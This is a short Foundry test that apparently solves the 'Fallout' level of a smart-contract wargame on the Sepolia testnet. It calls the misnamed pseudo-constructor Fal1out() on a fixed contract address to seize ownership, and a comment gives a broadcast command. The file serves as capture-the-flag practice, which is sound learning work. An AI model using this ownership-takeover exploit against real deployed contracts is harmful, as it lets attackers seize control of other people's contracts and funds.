//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";

interface IFallout {
    function Fal1out() external payable;

    function owner() external view returns (address);
}

contract level2Test is Test {
    IFallout target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        target = IFallout(0xFbA6C6DB93709183ca7F94AD06a8BaF6414e6B66);
    }

    function testIsExploit() public {
        target.Fal1out();
        assertEq(target.owner(), address(this));
    }
}
// forge script script/level2.s.sol:Level1Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey
